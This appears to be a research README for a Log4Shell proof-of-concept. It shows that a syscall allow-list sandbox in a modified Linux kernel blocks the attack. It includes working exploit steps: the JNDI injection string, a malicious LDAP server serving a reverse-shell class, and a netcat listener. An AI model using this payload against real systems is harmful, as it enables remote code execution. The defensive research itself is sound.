## Log4Shell
A small proof-of-concept for the Log4Shell vulnerability based on https://github.com/kozmer/log4j-shell-poc.
The vulnerable application is a simple login component which logs the username when login fails, using a vulnerable version of the Log4j logging framework.
The application is used to show how an attacker's capabilities can be restricted with a simple sandboxed execution environment, defined by the system calls that the application is allowed to make.

The code has only been tested on Ubuntu 22.04, using User Mode Linux.

## Requirements
The Maven project management tool has been used to compile the vulnerable application. However, testing the proof-of-concept should be possible without compiling the vulnerable application since a compiled version of the vulnerable application is already included in this repository.

Python 3 is used to start a malicious LDAP server, serving a class `Exploit.class` which tries to establish a reverse shell.

Netcat is used to catch the reverse shell connection.


## Testing the exploit
1. Optionally, compile the vulnerable application by running `mvn package`.
2. In a terminal window, start the vulnerable web application with the command `./jdk1.8.0_20/bin/java -cp target/log4shell-1.0-SNAPSHOT.jar com.poc.VulnerableApp VulnerableApp`.
3. In a second terminal window, start a Netcat listener with the command: `nc -lvnp 9001`.
4. In a third terminal window, start the malicious LDAP server with the command: `python3 poc.py --userip localhost --webport 8000 --lport 9001`.
5. In the vulnerable application, type in the following username `${jndi:ldap://localhost:1389/a}`. Then type in any password.
6. Go to the second terminal window. A reverse shell should now have been established. This can e.g. be tested by trying to run `ls` or `whoami`.

## Testing the exploit with a restricted Java interpreter
The ELF file of the Java interpreter `./jdk1.8.0_20/bin/java` contains information about the system calls that the interpreter requires to run the vulnerable application. In particular, the interpreter does not need to execute the `execve` system call to work properly. The `execve` system call is used to establish the reverse shell by executing `execve("/bin/sh", ...)`.

Thus, it is not possible to establish a reverse shell with the same easy approach as described above if the vulnerable application is run in a sandbox, where it is only allowed to execute the system calls that it requires to work properly.

To test this, perform the same steps as described above, but do it in the modified Linux kernel which can be found at: https://github.com/TobiasNissen/linux_kernel_fork. See more details on this below After performing step 5, the vulnerable application should now terminate, and no reverse shell should be established.


## Running the modified Linux kernel.
Firstly, build a root file system by running:
```
sudo sh ./fs/make_root_fs.sh
```

Then, build the Linux kernel by running the following command in the root directory of the modified Linux kernel:
```
make -j4 ARCH=um
```

The modified kernel can now be run with the following command from the root directory of the modified Linux kernel:
```
sudo ./linux ubda=<path_to_root_fs> rw mem=128M eth0=tuntap,,,192.168.0.254
```
Here, `<path_to_root_fs>` is the path to the root file system built in the first step. E.g.:
```
sudo ./linux ubda=../log4shell-poc/root_fs rw mem=128M eth0=tuntap,,,192.168.0.254
```

Observe that it is possible to connect two other terminals to the UML instance with:
```
sudo screen /dev/pts/X
sudo screen /dev/pts/Y
```
, where `X` and `Y` are the device numbers that can be found in the startup output when running the kernel.

In all terminals, the username `root` can be used with no password to login.

Now, bring up the network interface, required for localhost communication, by running:
```
ifconfig eth0 192.168.0.254 up
```

Next, create a mounting point with:
```
mkdir /mnt/tmp
```
, and then mount the log4shell-poc directory from the host machine with:
```
mount none /mnt/tmp -t hostfs -o /home/ttn/Desktop/log4shell-poc
```

The log4shell-poc directory can now be accessed by executing:
```
cd /mnt/tmp
```

From this point, the same steps as described above can be used to play with the Log4Shell proof of concept.
Note that the Java interpreter `./jdk1.8.0_20/bin/java_orig` can be used to demonstrate the Log4Shell vulnerability in the modified Linux kernel, since this is a version of the Java interpreter that has not been patched with an access right table.

The UML instance can be stopped with the command `halt`.


## Creating the restricted Java interpreter
The restricted Java interpreter was created by first analyzing the set of system calls required for the vulnerable application to
work properly. This was done using `strace`. In particular, the following command was executed from a `root` shell in the modified Linux kernel:
```
strace -f -o trace_uml.txt ./jdk1.8.0_20/bin/java -cp target/log4shell-1.0-SNAPSHOT.jar com.poc.VulnerableApp VulnerableApp
```
The vulnerable application was then used, trying to login with both invalid and valid logins before terminating the application.

Afterwards, a list of system call numbers were extracted with the command:
```
cat trace_uml.txt | tail -n +2 | cut -d" " -f3 | grep -o -e "^[^(]*" | sort | uniq > syscall_names_uml.txt
```
Note that the first system call in `trace.txt` is `execve("./jdk1.8.0_20/bin/java", ...)` which is used to spawn the Java interpreter. 
Thus, this system call is ignored with the `tail -n +2` command. Furthermore, a few invalid lines had to be removed manually.

Lastly, the extracted system calls were added to the ELF file of the Java interpreter by running `linux_set_up_access_rights.py ./jdk1.8.0_20/bin/java syscall_names_uml.txt`. Note that this requires `sh ./python_dependencies/install_dependencies` to be run first.

Note that the modified Linux kernel reads the required system calls added by `linux_set_up_access_rights.py` to the file `./jdk1.8.0_20/bin/java` and installs a seccomp-BPF filter that ensures that only these system calls are allowed for the vulnerable application. 

